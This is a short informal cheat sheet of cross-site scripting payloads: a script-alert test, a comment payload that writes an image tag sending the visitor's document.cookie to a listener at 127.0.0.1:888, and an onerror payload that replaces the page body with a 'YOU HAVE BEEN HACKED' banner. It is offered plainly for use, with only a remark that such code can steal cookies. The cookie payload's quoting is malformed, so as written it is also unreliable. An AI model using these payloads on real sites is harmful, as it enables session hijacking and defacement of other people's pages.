Cross-site scripting Code

To test vulnerability:
type <script>alert('Hello')</script>
then copyping that link, you can run the same js code anywhere, which can used to steal cookies, for example

In comment write:
"<script>document.write('img src= "http://127.0.0.1:888/'+document.cookie+'"')</script>

To completely replace HTML code of page:
<img src=x onerror="document.body.innerHTML='<h1>YOU HAVE BEEN HACKED</h1>'">
